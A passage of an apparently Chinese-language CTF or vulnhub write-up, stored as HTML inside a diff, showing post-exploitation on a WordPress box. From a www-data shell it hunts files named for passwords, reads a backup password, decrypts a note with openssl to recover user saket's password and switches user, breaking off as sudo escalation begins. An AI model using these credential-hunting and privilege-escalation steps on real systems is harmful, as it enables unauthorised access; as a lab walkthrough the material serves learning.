+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ ls -la /home/saket/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;ml/wordpress/wp-content/themes/twentynineteen$ ls -la /home/saket/ 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total &lt;span class="m"&gt;36&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; root root &lt;span class="m"&gt;4096&lt;/span&gt; Aug &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;drwxr-xr-x &lt;span class="m"&gt;4&lt;/span&gt; root root &lt;span class="m"&gt;4096&lt;/span&gt; Aug &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw------- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;20&lt;/span&gt; Aug &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; .bash_history
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rwxr-x--x &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;14272&lt;/span&gt; Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; enc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;18&lt;/span&gt; Aug &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; password.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;33&lt;/span&gt; Aug &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ cat /home/saket/user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;ml/wordpress/wp-content/themes/twentynineteen$ cat /home/saket/user.txt 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;af3c658dcf9d7190da3153519c003456
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;同时了解到有执行权限但没有读权限，但 sudo -l 显示可以以 root 身份、无需密码执行 /home/saket/enc。这是核心提权点&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ uname -a
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;ml/wordpress/wp-content/themes/twentynineteen$ uname -a 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Linux ubuntu 4.10.0-28-generic &lt;span class="c1"&gt;#32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这个内核比较老，或许可以尝试内核提权作为备选，先执行这个 enc 文件&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ sudo /home/saket/enc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;ml/wordpress/wp-content/themes/twentynineteen$ sudo /home/saket/enc 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;enter password: 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;输入之前获取的密码无果&lt;/p&gt;
+&lt;h2 id="获取执行-enc-文件需要的密码"&gt;获取执行 enc 文件需要的密码
+&lt;/h2&gt;&lt;p&gt;要寻找密码才能执行，联想到之前的password.txt 找找有无相似的敏感文件存储密码的可能&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;find / -type f &lt;span class="se"&gt;\(&lt;/span&gt; -iname &lt;span class="s2"&gt;&amp;#34;*backup*&amp;#34;&lt;/span&gt; -o -iname &lt;span class="s2"&gt;&amp;#34;*password*&amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\)&lt;/span&gt; 2&amp;gt;/dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;/opt/backup/server_database/backup_pass 这个文件很可疑&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ ls -la /opt/backup/server_database/backup_pass
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;emes/twentynineteen$ ls -la /opt/backup/server_database/backup_pass 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;75&lt;/span&gt; Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; /opt/backup/server_database/backup_pass
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ cat /opt/backup/server_database/backup_pass
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;emes/twentynineteen$ cat /opt/backup/server_database/backup_pass 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;your password &lt;span class="k"&gt;for&lt;/span&gt; backup_database file enc is 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;#34;backup_password&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Enjoy!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;backup_password 这个应该是密码，执行以下看看结果&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ &lt;span class="nb"&gt;cd&lt;/span&gt; /home/saket
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;ml/wordpress/wp-content/themes/twentynineteen$ &lt;span class="nb"&gt;cd&lt;/span&gt; /home/saket 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/home/saket$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;backup_password&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo /home/saket/enc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;backup_password&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo /home/saket/enc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;enter password: good
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/home/saket$ ls -la /home/saket/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ls -la /home/saket/
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;total &lt;span class="m"&gt;44&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;drwxr-xr-x &lt;span class="m"&gt;2&lt;/span&gt; root root &lt;span class="m"&gt;4096&lt;/span&gt; Sep &lt;span class="m"&gt;23&lt;/span&gt; 22:21 .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;drwxr-xr-x &lt;span class="m"&gt;4&lt;/span&gt; root root &lt;span class="m"&gt;4096&lt;/span&gt; Aug &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw------- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;20&lt;/span&gt; Aug &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; .bash_history
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rwxr-x--x &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;14272&lt;/span&gt; Aug &lt;span class="m"&gt;30&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; enc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;237&lt;/span&gt; Sep &lt;span class="m"&gt;23&lt;/span&gt; 22:23 enc.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;123&lt;/span&gt; Sep &lt;span class="m"&gt;23&lt;/span&gt; 22:23 key.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;18&lt;/span&gt; Aug &lt;span class="m"&gt;29&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; password.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;33&lt;/span&gt; Aug &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;多了一个 enc.txt 和 key.txt 读取一下&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;span class="lnt"&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/home/saket$ cat enc.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat enc.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4&lt;span class="o"&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/home/saket$ cat key.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cat key.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;I know you are the fan of ippsec.
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;So convert string &lt;span class="s2"&gt;&amp;#34;ippsec&amp;#34;&lt;/span&gt; into md5 &lt;span class="nb"&gt;hash&lt;/span&gt; and use it to gain yourself in your real form.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;把字符串 ippsec 转成 MD5 哈希作为密钥,再用它作为 AES-128-ECB 密钥解密 enc.txt&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/home/saket$ &lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;#34;ippsec&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; md5sum
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;#34;ippsec&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; md5sum
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;366a74cb3c959de17d61db30591c39d1 -
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这串东西是32 个字符，每个字符都是十六进制数字或字母，但 AES-256 需要 32 字节的密钥&lt;/p&gt;
+&lt;p&gt;把这 32 个字符本身当作密钥材料，也就是取每个字符的 ASCII 码&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/home/saket$ &lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;#34;366a74cb3c959de17d61db30591c39d1&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; xxd -p
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;$ &lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;#34;366a74cb3c959de17d61db30591c39d1&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; xxd -p 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;3336366137346362336339353964653137643631646233303539316333396431&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后开始解密&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/home/saket$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; openssl enc -d -a -aes-256-ecb -K &lt;span class="m"&gt;3336366137346362336339353964653137643631646233303539316333396431&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;&lt;span class="m"&gt;366137346362336339353964653137643631646233303539316333396431&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Dont worry saket one day we will reach to
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;our destination very soon. And &lt;span class="k"&gt;if&lt;/span&gt; you forget 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;your username &lt;span class="k"&gt;then&lt;/span&gt; use your old &lt;span class="nv"&gt;password&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;==&lt;/span&gt;&amp;gt; &lt;span class="s2"&gt;&amp;#34;tribute_to_ippsec&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;拿到密码了，看看能不能su切换用户&lt;/p&gt;
+&lt;h2 id="升级交互shell切换到saket用户"&gt;升级交互shell，切换到saket用户
+&lt;/h2&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-shell" data-lang="shell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$ python3 -c &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;emes/twentynineteen$ python3 -c &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;www-data@ubuntu:/home/saket$ su - saket
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;su - saket
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Password: tribute_to_ippsec
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ whoami&lt;span class="p"&gt;;&lt;/span&gt;id&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;whoami&lt;span class="p"&gt;;&lt;/span&gt;id&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;saket
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1001&lt;span class="o"&gt;(&lt;/span&gt;saket&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1001&lt;span class="o"&gt;(&lt;/span&gt;saket&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1001&lt;span class="o"&gt;(&lt;/span&gt;saket&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/home/saket
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;尝试sudo提权&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
